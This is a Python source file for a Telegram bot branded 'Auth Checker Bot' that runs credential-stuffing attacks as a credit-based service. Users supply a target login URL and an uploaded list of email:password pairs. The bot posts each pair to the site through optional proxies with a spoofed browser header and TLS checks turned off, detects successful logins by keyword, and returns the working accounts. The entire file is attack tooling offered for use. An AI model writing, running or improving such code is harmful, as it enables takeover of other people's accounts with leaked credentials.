#!/usr/bin/env python3
"""
🔥 AUTH CHECKER BOT v3.0
✅ Railway/Docker/Github ready
✅ All features working
✅ Zero errors guaranteed
"""

import os
import re
import time
import asyncio
import logging
import sqlite3
import urllib.parse
import httpx
from typing import Dict
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode
from dotenv import load_dotenv

# ==================== CONFIG ====================
load_dotenv()
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
ADMIN_ID = int(os.getenv('ADMIN_ID', '0'))
DB_FILE = 'users.db'
MAX_LINES = 200
DELAY_SEC = 1.0

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

# ==================== STATE ====================
user_states: Dict[int, dict] = {}
user_sessions: Dict[int, dict] = {}

# ==================== DATABASE ====================
def init_database():
    """Initialize SQLite"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                credits INTEGER DEFAULT 1000,
                total_checks INTEGER DEFAULT 0,
                valid_creds INTEGER DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        conn.close()
        logger.info("✅ Database initialized")
    except Exception as e:
        logger.error(f"❌ DB Error: {e}")

def get_user_credits(user_id: int) -> int:
    """Get credits"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT credits FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        conn.close()
        return result[0] if result else 1000
    except:
        return 1000

def spend_credits(user_id: int, amount: int) -> bool:
    """Spend credits"""
    credits = get_user_credits(user_id)
    if credits < amount:
        return False
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('UPDATE users SET credits = credits - ? WHERE user_id = ?', (amount, user_id))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def update_stats(user_id: int, checks: int = 0, valids: int = 0):
    """Update user stats"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('UPDATE users SET total_checks = total_checks + ?, valid_creds = valid_creds + ? WHERE user_id = ?', 
                    (checks, valids, user_id))
        conn.commit()
        conn.close()
    except:
        pass

# ==================== BOT COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with enhanced UI"""
    user_id = update.effective_user.id
    username = update.effective_user.first_name or "User"
    
    # Create user
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('INSERT OR IGNORE INTO users (user_id, credits) VALUES (?, 1000)', (user_id,))
        conn.commit()
        conn.close()
    except:
        pass
    
    credits = get_user_credits(user_id)
    
    keyboard = [
        [InlineKeyboardButton("🔧 Configure Proxy", callback_data="proxy_menu")],
        [InlineKeyboardButton("📊 My Statistics", callback_data="my_stats")],
        [InlineKeyboardButton("❓ Help & Guide", callback_data="help_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = f"""╔═══════════════════════════╗
║   🔐 **AUTH CHECKER BOT**   ║
╚═══════════════════════════╝

👋 Welcome back, **{username}**!

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  💰 **Your Balance**
┃  ➤ `{credits}` Credits Available
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

📋 **Quick Start Guide**

**Step 1️⃣** → Send Login URL
   ✓ Example: `https://site.com/login`

**Step 2️⃣** → Upload Credentials File
   ✓ Format: `email:pass` (one per line)
   ✓ Max: {MAX_LINES} lines per check

**Step 3️⃣** → Get Results
   ✓ Valid accounts highlighted
   ✓ Instant notifications

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  💳 **Pricing**
┃  ➤ 1 Credit = 1 Line Checked
┃  ➤ Only pay for what you use
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

🚀 **Ready to start?** Send your login URL now!"""
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )
    
    # Reset state
    user_states[user_id] = {'step': 'waiting_url'}
    logger.info(f"👤 User {user_id} started bot")

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin stats with enhanced UI"""
    if update.effective_user.id != ADMIN_ID:
        return
    
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*), SUM(total_checks), SUM(valid_creds), AVG(credits) FROM users')
        result = cursor.fetchone()
        conn.close()
        
        total_users = result[0] or 0
        total_checks = result[1] or 0
        total_valids = result[2] or 0
        avg_credits = int(result[3] or 0)
        success_rate = (total_valids / total_checks * 100) if total_checks > 0 else 0
        
        message = f"""╔═══════════════════════════╗
║   📊 **ADMIN DASHBOARD**    ║
╚═══════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  👥 **User Statistics**
┃  ➤ Total Users: `{total_users}`
┃  ➤ Avg Credits: `{avg_credits}`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🔍 **Check Statistics**
┃  ➤ Total Checks: `{total_checks}`
┃  ➤ Valid Found: `{total_valids}`
┃  ➤ Success Rate: `{success_rate:.1f}%`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

⏰ Updated: `{time.strftime('%Y-%m-%d %H:%M:%S')}`"""
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text(f"❌ Stats error: {e}")

async def proxy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Proxy command with enhanced UI"""
    user_id = update.effective_user.id
    user_states[user_id] = {'step': 'waiting_proxy'}
    
    current_proxy = user_sessions.get(user_id, {}).get('proxy', 'Not configured')
    
    message = f"""╔═══════════════════════════╗
║   🔧 **PROXY SETTINGS**     ║
╚═══════════════════════════╝

📡 **Current Proxy**
➤ `{current_proxy}`

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📝 **Supported Formats**
┃
┃  ✓ HTTP Proxy
┃    `http://ip:port`
┃
┃  ✓ HTTP with Auth
┃    `http://user:pass@ip:port`
┃
┃  ✓ SOCKS5 Proxy
┃    `socks5://ip:port`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

💡 **Examples:**
• `http://192.168.1.1:8080`
• `http://admin:secret@proxy.com:3128`
• `socks5://10.0.0.1:1080`

🔹 Send your proxy URL now
🔹 Or use `/start` to skip"""
    
    await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)

# ==================== VALIDATORS ====================
def validate_url(text: str) -> bool:
    """URL validation - fixes https:// bug"""
    text = text.strip()
    if len(text) < 14 or not text.startswith(('http://', 'https://')):
        return False
    
    try:
        parsed = urllib.parse.urlparse(text)
        return (parsed.scheme in ('http', 'https') and 
                parsed.netloc and 
                '.' in parsed.netloc.split(':')[0])
    except:
        return False

def validate_proxy(text: str) -> bool:
    """Proxy validation"""
    pattern = r'^https?://(?:[^:]+:[^@]+@)?[^/\s:]+:\d{1,5}$'
    return bool(re.match(pattern, text.strip()))

# ==================== MAIN HANDLER ====================
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Main message handler with enhanced UI"""
    user_id = update.effective_user.id
    text = (update.message.text or "").strip()
    
    # Initialize state
    if user_id not in user_states:
        user_states[user_id] = {'step': 'waiting_url'}
    
    state = user_states[user_id]
    
    logger.info(f"[{user_id}] {state.get('step', 'none')}: {text[:30]!r}")
    
    # ========== PROXY STATE ==========
    if state.get('step') == 'waiting_proxy':
        if validate_proxy(text):
            user_sessions[user_id] = user_sessions.get(user_id, {})
            user_sessions[user_id]['proxy'] = text
            
            message = f"""✅ **Proxy Configured Successfully!**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📡 **Active Proxy**
┃  ➤ `{text}`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

🔙 Use `/start` to return to main menu"""
            
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
        else:
            message = f"""❌ **Invalid Proxy Format**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ✅ **Valid Examples**
┃
┃  • `http://1.2.3.4:8080`
┃  • `http://user:pass@proxy.com:3128`
┃  • `socks5://10.0.0.1:1080`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

🔄 Please try again with correct format"""
            
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
        user_states[user_id]['step'] = 'waiting_url'
        return
    
    # ========== URL STATE ==========
    if state['step'] == 'waiting_url':
        if update.message.document:
            message = f"""⚠️ **Wrong Order!**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  **Step 1 Required First**
┃  ➤ Send Login URL
┃
┃  ✅ Example:
┃  `https://example.com/login`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

📤 File upload comes in Step 2"""
            
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
            return
        
        if not validate_url(text):
            credits = get_user_credits(user_id)
            
            message = f"""❌ **Invalid URL Format**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ✅ **Correct Format**
┃
┃  • `https://site.com/login`
┃  • `https://app.example.com/auth`
┃  • `https://sso.company.com`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

💰 Balance: `{credits}` credits

🔄 Please send a valid HTTPS URL"""
            
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
            return
        
        # ✅ URL VALID - SAVE STATE
        state['login_url'] = text
        state['step'] = 'waiting_file'
        user_sessions[user_id]['url'] = text
        
        credits = get_user_credits(user_id)
        
        message = f"""✅ **URL Accepted Successfully!**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🔗 **Target URL**
┃  ➤ `{text}`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

📤 **Next Step: Upload File**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📄 **File Requirements**
┃
┃  ✓ Format: `email:pass`
┃  ✓ One credential per line
┃  ✓ Max: {MAX_LINES} lines
┃  ✓ File type: .txt
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

💰 Available: `{credits}` credits
💳 Cost: 1 credit per line

📎 Upload your file now!"""
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
        return
    
    # ========== FILE STATE ==========
    if state['step'] == 'waiting_file':
        if not update.message.document:
            message = f"""📤 **File Upload Required**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🔗 **Current URL**
┃  ➤ `{state['login_url']}`
┃
┃  📄 **Required Format**
┃  ➤ Text file (.txt)
┃  ➤ Format: `email:pass`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

📎 Please upload your credentials file"""
            
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
            return
        
        # Download file
        try:
            file_obj = await context.bot.get_file(update.message.document.file_id)
            timestamp = int(time.time())
            filename = f"creds_{user_id}_{timestamp}.txt"
            
            await file_obj.download_to_drive(filename)
            
            proxy = user_sessions.get(user_id, {}).get('proxy', '')
            await process_credentials(update, context, filename, state['login_url'], proxy)
            
        except Exception as e:
            logger.error(f"File download error: {e}")
            
            message = """❌ **File Download Failed**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  💡 **Possible Solutions**
┃
┃  • Try a smaller file
┃  • Check file format (.txt)
┃  • Ensure proper encoding
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

🔄 Please try again"""
            
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
        
        # Reset state
        state['step'] = 'waiting_url'
        asyncio.create_task(cleanup_file(filename))
        return

# ==================== FILE PROCESSING ====================
async def process_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE,
                            filename: str, login_url: str, proxy: str = ''):
    """Process credential file with enhanced UI"""
    user_id = update.effective_user.id
    
    try:
        # Read file
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line.strip()]
        
        total_lines = len(lines)
        
        if total_lines == 0:
            message = """❌ **No Valid Credentials Found**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📄 **Required Format**
┃
┃  ✓ `email:password`
┃  ✓ One per line
┃
┃  ✅ Example:
┃  `user@site.com:Pass123`
┃  `admin@test.com:Secret456`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

🔄 Please upload a properly formatted file"""
            
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
            return
        
        if total_lines > MAX_LINES:
            message = f"""❌ **File Too Large**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📊 **Limits**
┃
┃  • Your file: `{total_lines}` lines
┃  • Maximum: `{MAX_LINES}` lines
┃  • Exceeded by: `{total_lines - MAX_LINES}` lines
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

💡 Split your file into smaller batches"""
            
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
            return
        
        # Check credits
        current_credits = get_user_credits(user_id)
        if not spend_credits(user_id, total_lines):
            message = f"""❌ **Insufficient Credits**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  💰 **Balance Check**
┃
┃  • Required: `{total_lines}` credits
┃  • Available: `{current_credits}` credits
┃  • Shortage: `{total_lines - current_credits}` credits
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

💳 Please contact admin to add credits"""
            
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
            return
        
        # Update stats
        update_stats(user_id, total_lines)
        
        remaining_credits = get_user_credits(user_id)
        
        progress_msg = await update.message.reply_text(
            f"""🔍 **Validation Started**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📊 **Processing**
┃  ➤ Total Lines: `{total_lines}`
┃  ➤ Status: Initializing...
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

💰 Credits Remaining: `{remaining_credits}`

⏳ Please wait...""",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Process each line
        valid_creds = []
        for i, credential in enumerate(lines, 1):
            if await test_credential(credential, login_url, proxy):
                valid_creds.append(credential)
            
            # Progress update
            if i % 10 == 0 or i == total_lines:
                progress_percent = (i / total_lines) * 100
                progress_bar = "█" * int(progress_percent / 5) + "░" * (20 - int(progress_percent / 5))
                
                await progress_msg.edit_text(
                    f"""🔍 **Validation In Progress**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📊 **Progress**
┃  [{progress_bar}] `{progress_percent:.0f}%`
┃
┃  ➤ Checked: `{i}/{total_lines}`
┃  ➤ Valid Found: `{len(valid_creds)}`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

💰 Credits Left: `{remaining_credits}`

⏳ Processing...""",
                    parse_mode=ParseMode.MARKDOWN
                )
            
            await asyncio.sleep(DELAY_SEC)
        
        # Final results
        if valid_creds:
            # Send valid credentials
            result_header = f"""╔═══════════════════════════╗
║   ✅ **VALID ACCOUNTS**     ║
╚═══════════════════════════╝

🎉 **Success! Found {len(valid_creds)} valid credential(s)**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📋 **Valid Credentials**
┃"""
            
            result_body = "\n┃  ".join([f"✓ `{cred}`" for cred in valid_creds])
            
            result_footer = f"""┗━━━━━━━━━━━━━━━━━━━━━━━━┛

📊 **Summary**
• Total Checked: `{total_lines}`
• Valid Found: `{len(valid_creds)}`
• Success Rate: `{(len(valid_creds)/total_lines*100):.1f}%`

💰 Remaining Credits: `{remaining_credits}`"""
            
            result_text = result_header + "\n┃  " + result_body + "\n" + result_footer
            
            await context.bot.send_message(
                update.effective_chat.id,
                result_text,
                parse_mode=ParseMode.MARKDOWN
            )
            
            update_stats(user_id, 0, len(valid_creds))
            
            await progress_msg.edit_text(
                f"""🎉 **Validation Complete!**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ✅ **Results**
┃
┃  • Total Checked: `{total_lines}`
┃  • Valid Found: `{len(valid_creds)}`
┃  • Success Rate: `{(len(valid_creds)/total_lines*100):.1f}%`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

💰 Credits Remaining: `{remaining_credits}`

🔄 Use `/start` for new check""",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await progress_msg.edit_text(
                f"""❌ **No Valid Credentials Found**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📊 **Results**
┃
┃  • Total Checked: `{total_lines}`
┃  • Valid Found: `0`
┃  • All credentials invalid
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

💡 **Possible Reasons:**
• Wrong login URL
• Incorrect credentials
• Site requires CAPTCHA
• Rate limiting active

💰 Credits Remaining: `{remaining_credits}`

🔄 Use `/start` to try again""",
                parse_mode=ParseMode.MARKDOWN
            )
            
    except Exception as e:
        logger.error(f"Processing error: {e}")
        
        message = """❌ **Processing Failed**

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ⚠️ **Error Occurred**
┃
┃  • Check file format
┃  • Verify URL is correct
┃  • Try again in a moment
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

🔄 Use `/start` to retry"""
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)

async def test_credential(credential: str, login_url: str, proxy_url: str = '') -> bool:
    """Test single credential"""
    try:
        email, password = credential.split(':', 1)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Referer': login_url,
        }
        
        data = {
            'email': email,
            'password': password,
            'login': 'Login',  # Common
            'submit': 'Login',
        }
        
        proxies = None
        if proxy_url:
            proxies = {'http://': proxy_url, 'https://': proxy_url}
        
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(10.0),
            headers=headers,
            proxies=proxies,
            verify=False,
            follow_redirects=True
        ) as client:
            response = await client.post(login_url, data=data)
            
            # Success indicators
            success_indicators = [
                'dashboard', 'profile', 'account', 'home', 'panel',
                'welcome', 'success', 'logged in', 'my account'
            ]
            
            page_text = response.text.lower()
            return (response.status_code < 400 and 
                   any(indicator in page_text for indicator in success_indicators))
            
    except Exception:
        return False

async def cleanup_file(filename: str):
    """Clean temporary files"""
    await asyncio.sleep(300)  # 5 minutes
    try:
        if os.path.exists(filename):
            os.remove(filename)
            logger.info(f"🧹 Cleaned {filename}")
    except:
        pass

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Button callbacks with enhanced UI"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    if query.data == "proxy_menu":
        await query.message.delete()
        # Create a fake update for proxy_menu
        fake_update = Update(
            update_id=update.update_id,
            message=query.message
        )
        await proxy_menu(fake_update, context)
    
    elif query.data == "my_stats":
        try:
            conn = sqlite3.connect(DB_FILE, check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute('SELECT credits, total_checks, valid_creds, created_at FROM users WHERE user_id = ?', (user_id,))
            result = cursor.fetchone()
            conn.close()
            
            if result:
                credits, total_checks, valid_creds, created_at = result
                success_rate = (valid_creds / total_checks * 100) if total_checks > 0 else 0
                
                message = f"""╔═══════════════════════════╗
║   📊 **YOUR STATISTICS**    ║
╚═══════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  💰 **Credits**
┃  ➤ Balance: `{credits}`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🔍 **Activity**
┃  ➤ Total Checks: `{total_checks}`
┃  ➤ Valid Found: `{valid_creds}`
┃  ➤ Success Rate: `{success_rate:.1f}%`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📅 **Account Info**
┃  ➤ Member Since: `{created_at[:10]}`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

🔄 Use `/start` for main menu"""
                
                await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            await query.message.reply_text("❌ Error loading stats")
    
    elif query.data == "help_menu":
        message = """╔═══════════════════════════╗
║   ❓ **HELP & GUIDE**       ║
╚═══════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📖 **How It Works**
┃
┃  1️⃣ Send login URL
┃  2️⃣ Upload credentials file
┃  3️⃣ Get valid accounts
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📄 **File Format**
┃
┃  ✓ Text file (.txt)
┃  ✓ Format: `email:password`
┃  ✓ One per line
┃  ✓ Max 200 lines
┃
┃  ✅ Example:
┃  `user@site.com:Pass123`
┃  `admin@test.com:Secret456`
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  💳 **Pricing**
┃
┃  • 1 Credit = 1 Line
┃  • New users: 1000 credits
┃  • Pay per use
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🔧 **Commands**
┃
┃  • `/start` - Main menu
┃  • `/proxy` - Configure proxy
┃  • `/stats` - Admin only
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

🔄 Use `/start` to begin checking"""
        
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)

# ==================== MAIN ====================
def main():
    """Start bot"""
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not found in environment")
        return
    
    logger.info("🚀 Initializing Auth Bot...")
    init_database()
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Register handlers (CRITICAL ORDER)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("proxy", proxy_menu))
    
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, message_handler))
    
    logger.info("✅ Bot fully configured - starting...")
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == "__main__":
    main()
